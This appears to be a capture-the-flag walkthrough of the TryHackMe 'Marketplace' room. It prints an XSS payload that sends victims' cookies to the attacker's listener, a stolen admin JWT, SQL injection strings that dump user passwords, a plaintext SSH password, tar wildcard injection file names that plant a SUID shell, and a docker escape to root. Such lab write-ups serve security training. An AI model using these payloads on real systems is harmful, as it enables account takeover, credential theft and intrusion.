# The Marketplace

**Room Link:** [https://tryhackme.com/room/marketplace](https://tryhackme.com/room/marketplace)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

## TCP/32768 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

## XSS - Steal JVT

[https://jwt.io/](https://jwt.io/)

<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>





I tried updating the token it didn't work

<figure><img src="../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>



Next we're going to try to steal the JWT from another user.

**Kali**

```
nc -lvnp 4444
```

**Browser**

```
<script>document.location='http://$KALI:4444/XSS/grabber.php?c='+document.cookie</script>
```

<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

This was annoying because if I went to my posts it wouldn't work so I went to Jakes post and changed the number from 2 to 6 to get to the report page. Then just clicked the report button

<figure><img src="../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

we got a token from a user that isn't us

<figure><img src="../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>



We can see it is from Michael who is an admin.

<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>





Sent again but this time just forwarded the request so we could see what that script was doing

<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>



The script was printing the flag

<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

This wasn't working before but after next time I went to this box tried I could just update the cookie from the browser and it worked.

<figure><img src="../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

**Brower cookie**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDE1MjgzODN9.O8218jJ0nmWedeewklX6fkb9sjlgH81ciU7dJG5l9YY
```



We add a order by and increase the number until we get an error to reveal how many fields there are.

<figure><img src="../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

After 5 it give us an error so we know there are four fields

<figure><img src="../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

We do a union select, first to try to show our 1s which isn't working because the first part of the statement runs successfully so theres no where to put our info

<figure><img src="../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

To work around this we make the userid as 0 which probably doesn't exist and we can start seeing our 1s

<figure><img src="../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>

Get Version

<figure><img src="../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>



Get Database

<figure><img src="../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>





Get tables

```
UNION SELECT table_name,1,1,1 FROM information_schema.tables WHERE table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>

Get All tables by concat

```
-1 UNION SELECT group_concat(table_name),1,1,1%20 FROM information_schema.tables WHERE table_schema =database()
```

<figure><img src="../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>





Get Columns for table users

```
-1%20UNION%20SELECT%20group_concat(column_name,column_type),1,1,1%20%20FROM%20information_schema.columns%20WHERE%20table_schema=marketplace
```

<figure><img src="../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

Get Columns for table items

```
-1 UNION SELECT group_concat(column_name,column_type),1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='items' AND table_schema='marketplace'
```

<figure><img src="../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

Get Columns for table messages

```
-1 UNION SELECT group_concat(column_name,column_type),1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='messages' AND table_schema='marketplace'
```

<figure><img src="../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>

Get Columns for table messages

```
-1%20UNION%20SELECT%20group_concat(message_content),1,1,1%20FROM%20messages
```

<figure><img src="../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>



Get usernames and passwords. The passwords aren't too useful at this point but now we have some usernames.

```
-1%20UNION%20SELECT%20group_concat(username,%27|%27,password),1,1,1%20FROM%20users
```

<figure><img src="../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>

## TCP/22 - SSH

**Kali**

```
ssh jake@$VICTIM
Password: @b_ENXkGYUCAv3zJ
```

<figure><img src="../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

## **Lateral Movement**

**Exploit:** [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

Jake can run a backup script as michael. The script is using a wildcard which we manipulate.&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can trick the script to run this to get a shell by making empty files with similar names

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd /opt/backups
mkdir priv
cd priv
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh shell.sh
vi shell.sh
```

**shell.sh**

```
#!/bin/bash

cp /bin/bash /opt/backups/michealbash;
chmod +xs  /opt/backups/michealbash;
```

**Victim**

```
chmod +x shell.sh 
rm -f ../backup.tar 
sudo -u michael /opt/backups/backup.sh 
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## **Privilege Escalation**

**Victim(micheal)**

```
id
find / -name docker.sock 2>/dev/null
docker images
docker run -it -v /:/host/ alpine chroot /host/ sh
```

michael is part of the docker group so it appears we're in a pod

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There a few images to test from. I just ran the last command above and changes the image name until it worked. Exploit worked with nginx and mysql images as well.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>







